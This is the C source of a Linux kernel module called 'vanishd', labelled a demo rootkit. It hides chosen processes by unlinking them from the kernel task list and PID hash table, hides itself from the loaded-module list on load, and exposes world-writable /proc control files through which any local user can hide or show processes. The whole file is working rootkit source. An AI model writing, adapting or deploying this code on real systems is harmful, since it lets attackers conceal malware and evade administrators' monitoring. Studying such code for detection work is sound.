#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h> 
#include <linux/string.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/list.h>

#include "ftrace_helper.h"



MODULE_LICENSE("GPL");
MODULE_AUTHOR("Logan Chamberlain"); 
MODULE_DESCRIPTION("A demo rootkit that hides processes using DKOM");


#define PROC_PROCESS "process" // procfs entry used to hide or show process
#define PROC_MODULE "module" // procfs entry used to hide or show the module itself 
#define BUF_SIZE 128


static struct proc_dir_entry *proc_file_process;
static struct proc_dir_entry *proc_file_module; 
static char usage_string[BUF_SIZE] = "vanishd rootkit loaded. Usage:\necho '[show|hide] <pid>' > /proc/process\necho '[show|hide]' > /proc/module\n";
static char kernel_buf[BUF_SIZE]; 
static unsigned long data_size = 109; // default length to read from /proc/process or /proc/module

// store the hidden task_struct and pid globally 
struct pid *pinned_pid = NULL; 
struct task_struct *task = NULL; 
struct list_head *prev_task = NULL; 


typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name_ptr = NULL;
rwlock_t *tasklist_lock_ptr = NULL; 

typedef void (*detach_pid_t)(struct task_struct *task, enum pid_type type);
typedef void (*attach_pid_t)(struct task_struct *task, enum pid_type type);

// attach|deattach_pid aren't exported, use ftrace helper to look them up 
detach_pid_t detach_pid_ptr = NULL;
attach_pid_t attach_pid_ptr = NULL;

static struct pid **task_pid_ptr(struct task_struct *task, enum pid_type type)
{
	return (type == PIDTYPE_PID) ?
		&task->thread_pid :
		&task->signal->pids[type];
}


int module_hidden = 0; 
static struct list_head *prev_module; 

static void hide_module(void) {
	if (!module_hidden) {
		prev_module = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list); 
		module_hidden = 1; 
		pr_info("vanishd: module hidden\n");
	}
}

static void unhide_module(void) {
	if (module_hidden) {
		list_add(&THIS_MODULE->list, prev_module);
		module_hidden = 0; 
		pr_info("vanishd: module unhidden\n"); 
	}
}
 
static void hide_process(int target_pid) {
	pr_info("vanishd: hiding pid: %d\n", target_pid); 
	pinned_pid = find_get_pid(target_pid); // increment ref count 
	if (!pinned_pid) {
		pr_err("vanishd: target pid not found\n"); 
		return; 
	}
	rcu_read_lock();
	task = pid_task(pinned_pid, PIDTYPE_PID); 
	if (task) {
		pr_info("vanishd: target comm -> %s\n", task->comm); 
	}
	rcu_read_unlock(); 
	// remove from global tasks* list
	write_lock_irq(tasklist_lock_ptr); 
	// save previous task to add it later 
	prev_task = task->tasks.prev; 
	// unlink from global tasks*
	list_del(&task->tasks); 
	write_unlock_irq(tasklist_lock_ptr); 
	pr_info("vanishd: unlinked from tasks list\n"); 
	// remove from pid hash table 
	write_lock_irq(tasklist_lock_ptr); 
	detach_pid_ptr(task, PIDTYPE_PID); 
	detach_pid_ptr(task, PIDTYPE_TGID); 
	write_unlock_irq(tasklist_lock_ptr); 
	pr_info("vanishd: removed from pid hash table\n"); 


}

static void unhide_process(int target_pid) {
	pr_info("vanishd: unhiding pid: %d\n", target_pid);
	if (pinned_pid == NULL || task == NULL ) {
		pr_err("vanishd: cannot unhide if nothing is hidden!\n"); 
		return; 
	} else if (pid_vnr(pinned_pid) != target_pid) { 
		pr_err("vanishd: cannot unhide a non-hidden process.\n"); 
		return; 
	}
	
	// add back to global tasks* list 
	write_lock_irq(tasklist_lock_ptr); 
	list_add(&task->tasks, prev_task); 
	write_unlock_irq(tasklist_lock_ptr); 
	pr_info("vanishd: inserted back into tasks list\n"); 
	// add to pid hash table again 
	write_lock_irq(tasklist_lock_ptr); 
	*task_pid_ptr(task, PIDTYPE_PID) = pinned_pid; 
	attach_pid_ptr(task, PIDTYPE_PID); 
	*task_pid_ptr(task, PIDTYPE_TGID) = pinned_pid; 
	attach_pid_ptr(task, PIDTYPE_TGID); 
	write_unlock_irq(tasklist_lock_ptr); 
	pr_info("vanishd: inserted back into pid hash table\n"); 

	put_pid(pinned_pid); // decrement the ref count 

}


// called when procfs entry is read: cat /proc/process or cat /proc/module 
static ssize_t proc_read(struct file *file, char __user *user_buf, size_t count, loff_t *ppos) {
	if (*ppos >= data_size) {
		return 0; // cursor is past the string
	}
	if (count > data_size - *ppos) {
		count = data_size - *ppos; 
	}
	// copy the usage string to user space 
	if (copy_to_user(user_buf, usage_string + *ppos, count)) {
		return -EFAULT; 
	}
	// advance the cursor
	*ppos += count; 
	return count; 
}

// called when procfs entry is written to: echo '[hide | show] <pid>' > /proc/process 
static ssize_t proc_write_process(struct file *file, const char __user *user_buf, size_t count, loff_t *ppos) {
	// no way I'm writing a buffer overflow in 2026 
	if (count >= BUF_SIZE) {
		data_size = BUF_SIZE - 1; 
	} else {
		data_size = count; 
	}
	if(copy_from_user(kernel_buf, user_buf, data_size)) {
		return -EFAULT; 
	}
	kernel_buf[data_size] = '\0'; 
	int target_pid; 
	if (strncmp(kernel_buf, "show", 4) == 0) {
		if (sscanf(kernel_buf, "show %d", &target_pid) == 1) {
			unhide_process(target_pid); 
		}
	} else if (strncmp(kernel_buf, "hide", 4) == 0) {
		if (sscanf(kernel_buf, "hide %d", &target_pid) == 1) {
			hide_process(target_pid); 
		}
	}
	return count; 
}


// called when procfs entry is written to: echo '[hide | show]' > /proc/module 
static ssize_t proc_write_module(struct file *file, const char __user *user_buf, size_t count, loff_t *ppos) {
	// no way I'm writing a buffer overflow in 2026 
	if (count >= BUF_SIZE) {
		data_size = BUF_SIZE - 1; 
	} else {
		data_size = count; 
	}
	if(copy_from_user(kernel_buf, user_buf, data_size)) {
		return -EFAULT; 
	}
	kernel_buf[data_size] = '\0'; 
	
	if (strncmp(kernel_buf, "show", 4) == 0) {
		unhide_module(); 
	} else if (strncmp(kernel_buf, "hide", 4) == 0) {
		hide_module(); 
	}
	return count; 
}



// both the read ops do the same thing: print the usage string. 
static const struct proc_ops proc_file_ops_process = {
	.proc_read = proc_read, 
	.proc_write = proc_write_process,
}; 

static const struct proc_ops proc_file_ops_module = {
	.proc_read = proc_read, 
	.proc_write = proc_write_module,
}; 



static int create_procfs_entries(void) {
	proc_file_process = proc_create(PROC_PROCESS, 0666, NULL, &proc_file_ops_process); 
	if (!proc_file_process) {
		return -ENOMEM; 
	}
	pr_info("vanishd: created /proc/%s\n", PROC_PROCESS); 
	proc_file_module = proc_create(PROC_MODULE, 0666, NULL, &proc_file_ops_module); 
	if (!proc_file_module) {
		return -ENOMEM; 
	}
	pr_info("vanishd: created /proc/%s\n", PROC_MODULE); 
	return 0; 
}



static void cleanup(void) {
	if (pinned_pid != NULL) {
		// rmmod was called with a task still hidden 
		unhide_process(pid_vnr(pinned_pid)); 
	}
	pr_info("vanishd: all remaining processes unhidden\n"); 
	proc_remove(proc_file_process); 
	pr_info("vanishd: /proc/%s removed\n", PROC_PROCESS); 
	proc_remove(proc_file_module); 
	pr_info("vanishd: /proc/%s removed\n", PROC_MODULE);
}


static int vanishd_init(void) {
	int res = create_procfs_entries(); 
	if ( res != 0 ) {
		pr_info("vanishd: error creating procfs entry.\n"); 
		return res; 
	}
	kallsyms_lookup_name_ptr = (void*)lookup_name("kallsyms_lookup_name"); 
	if(!kallsyms_lookup_name_ptr) {
		pr_err("vanishd: failed to lookup kallsyms_lookup_name\n"); 
		return -1; 
	}

	tasklist_lock_ptr = (rwlock_t *)kallsyms_lookup_name_ptr("tasklist_lock"); 
	if (!tasklist_lock_ptr) {
		pr_err("vanishd: failed to lookup tasklist_lock\n"); 
		return -1; 
	}

	detach_pid_ptr = (detach_pid_t)kallsyms_lookup_name_ptr("detach_pid"); 
	if(!detach_pid_ptr) {
		pr_err("vanishd: failed to lookup detach_pid\n"); 
		return -1;
	}

	attach_pid_ptr = (attach_pid_t)kallsyms_lookup_name_ptr("attach_pid"); 
	if(!attach_pid_ptr) {
		pr_err("vanishd: failed to lookup attach_pid\n"); 
		return -1; 
	}

	hide_module(); 
	return 0;
}





static void vanishd_exit(void) {
	cleanup(); 
	pr_info("vanishd: cleanup complete, unloading..\n"); 

}

module_init(vanishd_init);
module_exit(vanishd_exit);
